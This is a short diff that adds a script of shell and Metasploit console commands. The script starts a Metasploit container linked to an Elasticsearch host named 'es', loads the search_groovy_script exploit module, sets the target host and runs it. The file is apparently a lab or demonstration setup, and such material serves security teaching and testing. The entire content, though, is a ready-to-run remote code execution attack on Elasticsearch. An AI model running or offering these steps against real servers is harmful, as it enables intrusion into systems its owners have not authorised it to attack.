@@ -1,0 +1,5 @@
+docker run -it --link es:es benhall/metasploit
+use exploit/multi/elasticsearch/search_groovy_script
+set TARGET 0
+set RHOST es
+exploit
